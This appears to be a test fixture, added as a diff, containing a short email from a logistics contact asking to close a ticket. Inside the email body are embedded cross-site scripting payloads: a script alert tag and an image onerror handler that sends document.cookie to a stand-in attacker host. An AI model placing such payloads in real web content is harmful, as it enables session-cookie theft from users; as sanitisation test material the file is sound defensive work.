@@ -1,0 +1,9 @@
+From: Priya Deshmukh <priya.deshmukh@vantagelogistics.example>
+To: Nadia Okonkwo <nadia.okonkwo@reviewops.internal>
+Subject: Re: VLP-INJ-2026-0904 - clarification needed
+Date: August 6, 2026 11:20
+
+Hi Nadia, quick note on VLP-INJ-2026-0904 - can we close this out today? <script>alert('pwned')</script> let me know if you need anything else from our side. <img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
+
+Thanks,
+Priya
